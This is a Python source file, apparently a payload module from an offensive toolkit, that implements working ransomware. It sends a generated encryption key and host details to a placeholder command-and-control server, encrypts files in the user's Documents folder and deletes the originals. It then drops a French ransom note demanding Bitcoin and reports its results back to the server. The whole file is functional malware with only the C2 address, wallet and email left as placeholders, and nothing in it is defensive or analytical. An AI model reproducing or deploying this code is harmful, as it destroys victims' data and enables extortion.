#!/usr/bin/env python3
"""
payloads/ransomware.py — Chiffreur AES-256 Fernet
Envoie la clé au C2 avant de chiffrer.
Variables : FILL_C2_URL FILL_C2_HOST FILL_PORT
"""
import os, json, socket, platform
import urllib.request, datetime
from pathlib import Path
from cryptography.fernet import Fernet

C2         = "FILL_C2_URL"
BOT_ID     = socket.gethostname()
TARGET_DIR = str(Path.home() / "Documents")
EXT_LOCK   = ".fl_locked"
NOTE_NAME  = "LIRE_MOI.txt"
SKIP_EXT   = {".py",".exe",".dll",".sys",
              ".bat",".cmd",EXT_LOCK}
SKIP_DIRS  = {"Windows","Program Files",
              "Program Files (x86)"}

NOTE = """
╔══════════════════════════════════╗
║   VOS FICHIERS ONT ÉTÉ CHIFFRÉS ║
╠══════════════════════════════════╣
║                                  ║
║  Envoyez 0.05 BTC à :            ║
║  FILL_WALLET                     ║
║                                  ║
║  Contactez : FILL_EMAIL          ║
║  Votre ID  : {bot_id}
║  Date      : {date}
╚══════════════════════════════════╝
"""

def _post(url: str, data: dict):
    try:
        payload = json.dumps(
            data, default=str).encode()
        req = urllib.request.Request(
            url, data=payload,
            headers={"Content-Type":"application/json"},
            method="POST",
        )
        urllib.request.urlopen(req, timeout=8)
    except Exception:
        pass

KEY    = Fernet.generate_key()
FERNET = Fernet(KEY)

# Envoyer la clé AU C2 AVANT chiffrement
_post(f"{C2}/c2/result/{BOT_ID}", {
    "result": (
        f"[RANSOM_KEY] {KEY.decode()} | "
        f"target={TARGET_DIR} | "
        f"host={BOT_ID} | "
        f"os={platform.platform()}"
    )
})

encrypted = 0
errors    = 0

for root, dirs, files in os.walk(TARGET_DIR):
    dirs[:] = [
        d for d in dirs
        if not any(s in d for s in SKIP_DIRS)
    ]
    for fname in files:
        p = Path(root) / fname
        if p.suffix.lower() in SKIP_EXT:
            continue
        if EXT_LOCK in fname:
            continue
        try:
            data   = p.read_bytes()
            enc    = FERNET.encrypt(data)
            locked = p.with_suffix(
                p.suffix + EXT_LOCK)
            locked.write_bytes(enc)
            p.unlink()
            encrypted += 1
        except Exception:
            errors += 1

note_text = NOTE.format(
    bot_id=BOT_ID,
    date=datetime.datetime.now()
         .strftime("%Y-%m-%d %H:%M"),
)
for d in [TARGET_DIR,
          str(Path.home() / "Desktop"),
          str(Path.home())]:
    try:
        (Path(d) / NOTE_NAME).write_text(note_text)
    except Exception:
        pass

_post(f"{C2}/c2/result/{BOT_ID}", {
    "result": (
        f"[RANSOM_DONE] encrypted={encrypted} "
        f"errors={errors} target={TARGET_DIR}"
    )
})